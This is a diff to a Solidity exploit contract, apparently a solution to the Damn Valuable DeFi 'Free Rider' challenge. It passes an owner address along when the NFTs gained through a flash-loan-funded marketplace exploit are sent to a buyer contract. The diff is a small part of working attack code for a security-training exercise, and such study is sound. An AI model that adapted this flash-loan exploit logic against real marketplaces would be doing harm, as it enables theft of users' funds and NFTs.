@@ -20,6 +20,7 @@ contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
     address payable immutable buyerMarketplace;
     address immutable buyer;
     address immutable nft;
+    address immutable owner;
 
     constructor(
         address payable _weth,
@@ -27,7 +28,8 @@ contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
         address _dvt,
         address payable _buyerMarketplace,
         address _buyer,
-        address _nft
+        address _nft,
+        address _owner
     )  {
         weth = _weth;
         dvt = _dvt;
@@ -35,6 +37,7 @@ contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
         buyerMarketplace = _buyerMarketplace;
         buyer = _buyer;
         nft = _nft;
+        owner = _owner;
     }
 
     event Log(string message, uint256 val);
@@ -87,7 +90,6 @@ contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
         uint256 amountToRepay = amount + fee;
 
         uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));
-
         // Withdraw all WETH to ETH
         tokenBorrow.functionCall(abi.encodeWithSignature("withdraw(uint256)", currBal));
 
@@ -102,10 +104,12 @@ contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
             tokenIds
         );
 
+
         // Transfer newly attained NFTs to Buyer Contract
         for (uint256 i = 0; i < 6; i++) {
-            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
+            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i, abi.encode(owner));
         }
+
 
         // Deposit ETH into WETH contract
         // ETH came from Buyer Contract + Marketplace exploit
